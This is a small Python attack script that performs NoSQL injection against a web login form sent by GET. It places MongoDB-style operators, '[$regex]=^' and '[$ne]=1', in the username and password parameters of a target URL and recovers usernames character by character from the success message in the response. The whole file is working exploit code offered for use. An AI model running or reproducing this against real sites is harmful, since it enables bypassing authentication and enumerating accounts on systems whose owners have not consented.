import requests as req, string, argparse, time




# This only work with get method, feel free to make  pull request if u want to add post
parser = argparse.ArgumentParser()
parser.add_argument('-u', type=str, dest='url', required=True, help='Url of the target http://www.url.com/subdomain/')
parser.add_argument('-l', type=str, dest='login', default="login", help='username field (e.g user,username, login)')
parser.add_argument('-p', type=str, dest='pas', default="pass", help='password field (e.g password,pass)')
parser.add_argument('-m', type=str, dest='m', default="", help='any other data (e.g &submit=true&valid=1). ')

args = parser.parse_args()

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"%=[]:;"


pa1= args.login+"[$regex]=^"
pa2 = args.pas+"[$ne]=1"
print('[+] Format url: '+args.url+"?"+pa1+"&"+pa2+args.m)
def findl(rec=True,f=""):
  for i in alphabet:
    nu = args.url+"?"+pa1+f+i+"&"+pa2+args.m
    rep = req.get(nu)
    time.sleep(0.07)
    if 'You are connected as' in rep.text:
      if rec==True:
        print(f'\n[+] New letter found : {f+i}')
        findl(False,f+i)
      else:
        print(f'--> New letter found : {f+i}')
        findl(False,f+i)


findl()